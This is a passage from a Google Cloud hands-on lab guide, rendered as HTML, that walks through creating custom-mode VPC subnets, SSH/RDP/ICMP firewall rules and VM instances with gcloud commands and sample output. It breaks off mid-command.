padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets create privatesubnet-2 --network=privatenet --region=europe-west4 --range=172.20.0.0/20</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><h4 id='test-completed-task-9'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created a privatenet network, you will see an assessment score.</span></p><p><span>Create the privatenet network</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Run the following command to list the available VPC networks:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: default</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SUBNET_MODE: AUTO</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP_ROUTING_MODE: REGIONAL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IPV4_RANGE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GATEWAY_IPV4:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: managementnet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SUBNET_MODE: CUSTOM</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">BGP_ROUTING_MODE: REGIONAL</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IPV4_RANGE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GATEWAY_IPV4:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 293px;"></div><div class="CodeMirror-gutters" style="display: none; height: 293px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> </span><strong><span>default</span></strong><span> and </span><strong><span>mynetwork</span></strong><span> are auto mode networks, whereas, </span><strong><span>managementnet</span></strong><span> and </span><strong><span>privatenet</span></strong><span> are custom mode networks. Auto mode networks create subnets in each region automatically, while custom mode networks start with no subnets, giving you full control over subnet creation</span></p><ol start='' ><li><p><span>Run the following command to list the available VPC subnets (sorted by VPC network):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute networks subnets list --sort-by=NETWORK</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: default</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">REGION: us-west1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">RANGE: 10.128.0.0/20</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STACK_TYPE: IPV4_ONLY</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">IPV6_ACCESS_TYPE:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">INTERNAL_IPV6_PREFIX:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">EXTERNAL_IPV6_PREFIX:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 225px;"></div><div class="CodeMirror-gutters" style="display: none; height: 225px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> As expected, the </span><strong><span>default</span></strong><span> and </span><strong><span>mynetwork</span></strong><span> networks have subnets in </span><a href='https://cloud.google.com/compute/docs/regions-zones/#available'><span>each region </span><strong><span>(zones/regions may changes as per lab&#39;s requirements)</span></strong></a><span> as they are auto mode networks. The </span><strong><span>managementnet</span></strong><span> and </span><strong><span>privatenet</span></strong><span> networks only have the subnets that you created as they are custom mode networks .</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>VPC networks</span></strong><span>.</span></p></li><li><p><span>You see that the same networks and subnets are listed in the Cloud console.</span></p></li></ol><h3 id='create-the-firewall-rules-for-managementnet'><span>Create the firewall rules for managementnet</span></h3><p><span>Create firewall rules to allow </span><strong><span>SSH</span></strong><span>, </span><strong><span>ICMP</span></strong><span>, and </span><strong><span>RDP</span></strong><span> ingress traffic to VM instances on the </span><strong><span>managementnet</span></strong><span> network.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>) &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ Create Firewall Rule</span></strong><span>.</span></p></li><li><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Name</span></td><td style='text-align:left;' ><span>managementnet-allow-icmp-ssh-rdp</span></td></tr><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>managementnet</span></td></tr><tr><td style='text-align:left;' ><span>Targets</span></td><td style='text-align:left;' ><span>All instances in the network</span></td></tr><tr><td style='text-align:left;' ><span>Source filter</span></td><td style='text-align:left;' ><span>IPv4 Ranges</span></td></tr><tr><td style='text-align:left;' ><span>Source IPv4 ranges</span></td><td style='text-align:left;' ><span>0.0.0.0/0</span></td></tr><tr><td style='text-align:left;' ><span>Protocols and ports</span></td><td style='text-align:left;' ><span>Specified protocols and ports, and then </span><em><span>check</span></em><span> tcp, </span><em><span>type:</span></em><span> 22, 3389; and </span><em><span>check</span></em><span> Other protocols, </span><em><span>type:</span></em><span> icmp.</span></td></tr></tbody></table></figure></li></ol><p><strong><span>Note:</span></strong><span> Make sure to include the </span><strong><span>/0</span></strong><span> in the </span><strong><span>Source IPv4 ranges</span></strong><span> to specify all networks.</span></p><ol start='' ><li><p><span>Click </span><strong><span>EQUIVALENT COMMAND LINE</span></strong><span>.</span></p><p><span>These commands illustrate that firewall rules can also be created using the Cloud Shell command line. You will create the </span><strong><span>privatenet</span></strong><span>&#39;s firewall rules using these commands with similar parameters.</span></p></li><li><p><span>Click </span><strong><span>Close</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-10'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created firewall rules for managementnet network, you will see an assessment score.</span></p><p><span>Create the firewall rules for managementnet</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='create-the-firewall-rules-for-privatenet'><span>Create the firewall rules for privatenet</span></h3><p><span>Create the firewall rules for </span><strong><span>privatenet</span></strong><span> network using the Cloud Shell command line.</span></p><ol start='' ><li><p><span>In Cloud Shell, run the following command to create the </span><strong><span>privatenet-allow-icmp-ssh-rdp</span></strong><span> firewall rule:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create privatenet-allow-icmp-ssh-rdp --direction=INGRESS --priority=1000 --network=privatenet --action=ALLOW --rules=icmp,tcp:22,tcp:3389 --source-ranges=0.0.0.0/0</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Creating firewall...done.</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: privatenet-allow-icmp-ssh-rdp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: privatenet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DIRECTION: INGRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PRIORITY: 1000</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ALLOW: icmp,tcp:22,tcp:3389</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DENY:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DISABLED: False</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 180px;"></div><div class="CodeMirror-gutters" style="display: none; height: 180px;"></div></div></div></pre><h4 id='test-completed-task-11'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created firewall rules for privatenet network, you will see an assessment score.</span></p><p><span>Create the firewall rules for privatenet</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><ol start='' ><li><p><span>Run the following command to list all the firewall rules (sorted by VPC network):</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules list --sort-by=NETWORK</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The output should look like this:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: default-allow-icmp</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DIRECTION: INGRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PRIORITY: 65534</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ALLOW: icmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DENY:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DISABLED: False</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NAME: default-allow-internal</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">NETWORK: default</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DIRECTION: INGRESS</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">PRIORITY: 65534</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ALLOW: tcp:0-65535,udp:0-65535,icmp</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DENY:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">DISABLED: False</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 383px;"></div><div class="CodeMirror-gutters" style="display: none; height: 383px;"></div></div></div></pre><p><span>The firewall rules for </span><strong><span>mynetwork</span></strong><span> network have been created for you. You can define multiple protocols and ports in one firewall rule (</span><strong><span>privatenet</span></strong><span> and </span><strong><span>managementnet</span></strong><span>), or spread them across multiple rules (</span><strong><span>default</span></strong><span> and </span><strong><span>mynetwork</span></strong><span>).</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>VPC network</span></strong><span> &gt; </span><strong><span>Firewall</span></strong><span>.</span></p></li><li><p><span>You see that the same firewall rules are listed in the Cloud console.</span></p></li></ol><h2 id='task-2-create-vm-instances'><span>Task 2. Create VM instances</span></h2><p><span>Create two VM instances:</span></p><ul><li><p><strong><span>managementnet-vm-1</span></strong><span> in </span><strong><span>managementsubnet-1</span></strong></p></li><li><p><strong><span>privatenet-vm-1</span></strong><span> in </span><strong><span>privatesubnet-1</span></strong></p></li></ul><h3 id='create-the-managementnet-vm-1-instance'><span>Create the managementnet-vm-1 instance</span></h3><p><span>Create the </span><strong><span>managementnet-vm-1</span></strong><span> instance using the Cloud console.</span></p><ol start='' ><li><p><span>In the Cloud console, navigate to </span><strong><span>Navigation menu</span></strong><span> &gt; </span><strong><span>Compute Engine</span></strong><span> &gt; </span><strong><span>VM instances</span></strong><span>.</span></p><p><span>The </span><strong><span>mynet-vm-2</span></strong><span> and </span><strong><span>mynet-vm-1</span></strong><span> has been created for you, as part of your network diagram.</span></p></li><li><p><span>Click </span><strong><span>Create Instance</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Machine configuration</span></strong><span>:</span></p><p><span>Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><strong><span>Name</span></strong></td><td style='text-align:left;' ><span>managementnet-vm-1</span></td></tr><tr><td style='text-align:left;' ><strong><span>Region</span></strong></td><td style='text-align:left;' ><code>us-west1</code></td></tr><tr><td style='text-align:left;' ><strong><span>Zone</span></strong></td><td style='text-align:left;' ><code>us-west1-a</code></td></tr><tr><td style='text-align:left;' ><strong><span>Series</span></strong></td><td style='text-align:left;' ><code>E2</code></td></tr><tr><td style='text-align:left;' ><strong><span>Machine Type</span></strong></td><td style='text-align:left;' ><code>e2-micro</code></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Networking</span></strong><span>.</span></p><p><span>For </span><strong><span>Network interfaces</span></strong><span>, click the dropdown to edit. Set the following values, leave all other values at their defaults:</span></p><figure class='table-figure'><table><thead><tr><th style='text-align:left;' ><span>Property</span></th><th style='text-align:left;' ><span>Value (type value or select option as specified)</span></th></tr></thead><tbody><tr><td style='text-align:left;' ><span>Network</span></td><td style='text-align:left;' ><span>managementnet</span></td></tr><tr><td style='text-align:left;' ><span>Subnetwork</span></td><td style='text-align:left;' ><span>managementsubnet-1</span></td></tr></tbody></table></figure></li><li><p><span>Click </span><strong><span>Done</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>EQUIVALENT CODE</span></strong><span>.</span></p><p><span>This illustrate that VM instances can also be created using the Cloud Shell command line. You will create the </span><strong><span>privatenet-vm-1</span></strong><span> instance using these commands with similar parameters.</span></p></li><li><p><span>Click </span><strong><span>Create</span></strong><span>.</span></p></li></ol><h4 id='test-completed-task-12'><span>Test Completed Task</span></h4><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify your performed task. If you have successfully created VM instance in managementnet network, you will see an assessment score.</span></p><p><span>Create the managementnet-vm-1 instance</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h3 id='create-the-privatenet-vm-1-instance'><span>Create the privatenet-vm-1 instance</span></h3><p><span>Create the </span><strong><span>privatenet-vm-1</span></strong><span> instance using the Cloud Shell command line.</span></p><ol start='' ><li><p><span>In Cloud Shell, run the following command to create the </span><strong><span>privatenet-vm-1</span></strong><span> instance:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create 